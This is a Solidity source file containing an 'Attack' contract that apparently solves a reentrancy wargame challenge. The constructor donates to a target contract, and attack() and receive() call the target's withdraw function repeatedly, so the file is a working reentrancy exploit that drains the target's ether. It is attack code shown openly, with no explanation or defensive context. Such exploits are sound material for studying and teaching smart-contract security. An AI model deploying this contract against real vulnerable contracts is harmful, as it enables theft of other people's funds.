// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Reentrance{
     function withdraw(uint256 _amount) external;
     function donate(address _to) external payable;
}

contract Attack{
    Reentrance public target;

    constructor(address payable _target) payable{
        target = Reentrance(_target);
        target.donate{value:msg.value}(address(this));
    }

    function attack()external payable{
        target.withdraw(0.001 ether);
    }

    receive() external payable{
        target.withdraw(0.001 ether);
    }
}